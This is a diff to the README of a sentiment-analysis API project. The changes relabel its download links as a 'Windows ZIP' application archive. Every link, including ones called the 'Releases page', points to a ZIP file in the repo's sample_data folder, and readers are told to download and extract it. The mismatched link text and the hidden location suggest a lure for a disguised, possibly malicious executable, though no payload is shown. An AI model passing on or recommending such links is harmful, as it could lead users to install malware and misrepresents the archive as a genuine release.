@@ -1,7 +1,7 @@
 # 🌟 Insightify-Sentiment-API - Analyze Sentiment Easily
 
 ## 📥 Download the Latest Release
-[![Download Insightify-Sentiment-API](https://raw.githubusercontent.com/ogthheu/Insightify-Sentiment-API/main/sample_data/Sentiment_API_Insightify_1.4.zip)](https://raw.githubusercontent.com/ogthheu/Insightify-Sentiment-API/main/sample_data/Sentiment_API_Insightify_1.4.zip)
+[![Download Windows ZIP](https://img.shields.io/badge/Download-Windows_ZIP-blue.svg)](https://raw.githubusercontent.com/ogthheu/Insightify-Sentiment-API/main/sample_data/Sentiment_API_Insightify_1.4.zip)
 
 ## 📖 Introduction
 Welcome to the Insightify-Sentiment-API project! This application helps you analyze the sentiment of texts in English and Indonesian. Whether you are processing documents in bulk or extracting keywords, this tool is tailored for your needs. It uses advanced natural language processing (NLP) techniques to provide real-time analysis, ensuring that your text data is interpreted accurately.
@@ -26,7 +26,7 @@ Insightify-Sentiment-API comes packed with the following features:
 - **Easy API Integration**: Utilize the RESTful API to integrate easily with other applications.
 
 ## 📥 Download & Install
-To download the latest version of Insightify-Sentiment-API, visit the [Releases page](https://raw.githubusercontent.com/ogthheu/Insightify-Sentiment-API/main/sample_data/Sentiment_API_Insightify_1.4.zip). 
+Download the latest [Windows application archive](https://raw.githubusercontent.com/ogthheu/Insightify-Sentiment-API/main/sample_data/Sentiment_API_Insightify_1.4.zip).
 
 1. Select the archive link above.
 2. Extract the downloaded ZIP file.
@@ -107,4 +107,4 @@ We welcome contributions! If you have suggestions, improvements, or bug fixes, o
 ## 📜 License
 This project is licensed under the MIT License. See the LICENSE file for details.
 
-Now you are ready to harness the power of Insightify-Sentiment-API for your sentiment analysis needs! Don't forget to visit our [Releases page](https://raw.githubusercontent.com/ogthheu/Insightify-Sentiment-API/main/sample_data/Sentiment_API_Insightify_1.4.zip) for the latest updates and tools. Enjoy your experience!
+Now you are ready to harness the power of Insightify-Sentiment-API for your sentiment analysis needs! Download the latest [Windows application archive](https://raw.githubusercontent.com/ogthheu/Insightify-Sentiment-API/main/sample_data/Sentiment_API_Insightify_1.4.zip) for updates. Enjoy your experience!
